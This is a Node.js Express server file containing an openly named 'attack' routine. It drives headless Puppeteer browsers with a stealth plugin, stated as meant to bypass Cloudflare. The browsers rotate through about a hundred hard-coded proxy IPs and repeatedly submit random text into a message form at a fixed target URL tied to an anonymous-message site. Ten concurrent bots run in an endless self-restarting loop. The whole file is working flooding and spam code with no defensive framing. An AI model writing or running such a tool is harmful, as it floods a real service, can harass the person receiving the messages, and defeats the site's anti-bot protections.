// server.js
const express = require("express");
const puppeteerExtra = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const app = express();
const PORT = process.env.PORT || 3000;
const cors = require("cors");
app.use(express.json());
app.use(cors());

// Apply stealth plugin to bypass Cloudflare
puppeteerExtra.use(StealthPlugin());

// Utility logger
const log = (...args) => console.log(new Date().toISOString(), ...args);

async function attack(target, action, maxIterations = 50) {
  // Reduced default maxIterations for safer testing
  console.log("Attack started...");

  // -- Helpers --------------------------------------------------
  function generateRandomText(length) {
    const chars =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }


  const proxies = [
    "http://156.253.174.123:3129",
    "http://156.228.189.131:3129",
    "http://156.228.106.100:3129",
    "http://156.242.33.138:3129",
    "http://156.253.171.45:3129",
    "http://156.249.56.188:3129",
    "http://156.253.168.147:3129",
    "http://154.213.204.24:3129",
    "http://156.228.184.121:3129",
    "http://156.228.100.38:3129",
    "http://156.228.181.126:3129",
    "http://156.228.102.77:3129",
    "http://156.242.35.252:3129",
    "http://154.213.164.212:3129",
    "http://156.228.118.103:3129",
    "http://156.242.43.52:3129",
    "http://45.202.78.127:3129",
    "http://156.228.117.17:3129",
    "http://156.228.0.10:3129",
    "http://154.91.171.186:3129",
    "http://156.228.181.146:3129",
    "http://156.228.183.130:3129",
    "http://156.228.78.77:3129",
    "http://156.242.39.140:3129",
    "http://156.228.89.200:3129",
    "http://156.228.108.155:3129",
    "http://156.242.43.87:3129",
    "http://156.228.76.94:3129",
    "http://156.228.83.252:3129",
    "http://154.213.193.248:3129",
    "http://156.253.169.138:3129",
    "http://156.253.174.213:3129",
    "http://156.253.172.123:3129",
    "http://156.249.137.58:3129",
    "http://156.242.37.135:3129",
    "http://156.228.81.59:3129",
    "http://154.213.165.181:3129",
    "http://156.253.173.64:3129",
    "http://156.228.124.15:3129",
    "http://156.228.100.11:3129",
    "http://156.228.111.11:3129",
    "http://156.228.93.222:3129",
    "http://45.202.76.229:3129",
    "http://154.213.161.215:3129",
    "http://156.228.80.6:3129",
    "http://156.228.77.203:3129",
    "http://156.233.94.75:3129",
    "http://156.253.179.37:3129",
    "http://156.228.95.189:3129",
    "http://154.213.194.199:3129",
    "http://156.242.35.169:3129",
    "http://154.94.13.105:3129",
    "http://156.228.101.100:3129",
    "http://156.242.35.18:3129",
    "http://156.228.112.171:3129",
    "http://156.228.171.11:3129",
    "http://156.242.33.214:3129",
    "http://156.249.138.76:3129",
    "http://156.233.84.45:3129",
    "http://156.248.87.86:3129",
    "http://154.213.163.14:3129",
    "http://156.242.44.165:3129",
    "http://156.228.125.108:3129",
    "http://156.228.179.225:3129",
    "http://154.213.165.207:3129",
    "http://156.233.87.10:3129",
    "http://156.242.44.128:3129",
    "http://156.228.90.168:3129",
    "http://156.228.115.83:3129",
    "http://154.213.163.124:3129",
    "http://156.228.115.191:3129",
    "http://156.253.171.217:3129",
    "http://156.253.173.244:3129",
    "http://156.228.114.170:3129",
    "http://156.228.171.36:3129",
    "http://156.249.62.92:3129",
    "http://156.240.99.54:3129",
    "http://156.249.58.162:3129",
    "http://156.240.99.7:3129",
    "http://154.213.166.95:3129",
    "http://156.253.177.61:3129",
    "http://156.228.102.194:3129",
    "http://156.228.96.203:3129",
    "http://156.228.99.53:3129",
    "http://154.94.12.251:3129",
    "http://156.248.83.50:3129",
    "http://156.228.180.92:3129",
    "http://154.213.197.10:3129",
    "http://156.242.36.135:3129",
    "http://156.228.175.229:3129",
    "http://156.233.87.165:3129",
    "http://156.228.81.11:3129",
    "http://154.213.204.234:3129",
    "http://156.242.35.75:3129",
    "http://156.228.111.5:3129",
    "http://156.242.38.135:3129",
    "http://156.242.35.80:3129",
    "http://156.233.92.39:3129",
    "http://156.228.181.134:3129",
    "http://156.228.109.35:3129",
  ];

  function getRandomProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
  }

  const UA =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";

  let browser; // Declare browser and page outside try-catch to ensure finally block can access them
  let page;

  try {
    if (!target) throw new Error("target required");
    log("Attack target:", { target });

    // -- Launch Browser ONCE per attack instance ----------------------------------
    let proxy = getRandomProxy();
    log("Using proxy:", proxy);
    browser = await puppeteerExtra.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        `--proxy-server=${proxy}`,
        "--disable-gpu", // Often helps with performance in headless
        "--disable-dev-shm-usage", // Important for Docker/Linux environments
        "--no-zygote", // Can help reduce memory
      ],
    });
    page = await browser.newPage();
    await page.setUserAgent(UA);
    // Set a reasonable default navigation timeout (e.g., 60 seconds)
    await page.setDefaultNavigationTimeout(60000); // 60 seconds

    let track = 1;

    // -- Loop for a fixed number of iterations, reusing the same browser/page -------------------------------------------
    while (track <= maxIterations) {
      const attackUrl = target;
      log(`Track ${track}: Loading attack url: ${attackUrl}`);
      // REUSE the 'page' object by navigating to the URL
      await page.goto(attackUrl, { waitUntil: "domcontentloaded" }); // 'domcontentloaded' is often faster for basic interactions

      // check for your input & button selectors
      const inputSel = action.input;
      const btnSel = action.button;
      const inputEl = await page.$(inputSel);
      const btnEl = await page.$(btnSel);

      if (inputEl && btnEl) {
        // generate & send 300 chars (consistent with your change)
        const txt = generateRandomText(200);
        log(`Track ${track}: typing ${txt.length} chars…`);
        await page.type(inputSel, txt);

        // click it
        await page.click(btnSel);

       
        log(`Track ${track}`);

      } else {
        log(
          `Track ${track}: elements not found (${inputSel} or ${btnSel}), skipping action.`
        );
        // You might want to add more robust error handling here,
        // e.g., break if the page structure consistently changes or elements are missing
      }

      log(`Track ${track}: completed iteration.`);
      track++;
    }

    log(`Attack instance finished after ${maxIterations} iterations.`);
  } catch (err) {
    log(`Error in attack function for target ${target}: ${err.message}`);
    // Optionally, re-throw if you want the calling `Promise.all` to catch it and stop
    // throw err;
  } finally {
    // Ensure browser is closed AFTER all iterations for this attack instance are done
    if (browser) {
      await browser.close();
      log(`Browser closed for attack instance on ${target}.`);
    }
  }
}



const targetURL = "https://gdpd.xyz/void90"; 
const attackAction = {
  input: 'textarea[name="message"]', // Adjusted selector based on ngl.link
  button: 'button[name="btn-msg"]', // Adjusted selector based on ngl.link
};

// This function now uses the optimized 'attack'
async function startAttackProcesses(numberOfBots = 10) {
  // Default to 5 bots
  const attackPromises = [];
  console.log(
    `Preparing to launch ${numberOfBots} concurrent bot instances...`
  );

  for (let i = 0; i < numberOfBots; i++) {
    // Each call to attack is an independent "device" simulation with its own browser instance
    attackPromises.push(attack(targetURL, attackAction, 10)); // Each bot does 10 iterations
  }

  try {
    await Promise.all(attackPromises);
    console.log(`All ${numberOfBots} bot instances completed their attacks.`);
  } catch (error) {
    console.error("An error occurred during bot execution:", error);
  } finally {
    startAttackProcesses(10);
  }
}

startAttackProcesses(10); // Launch 10 concurrent bots, each doing 10 iterations

app.listen(PORT, () => log(`Server listening on port ${PORT}`));
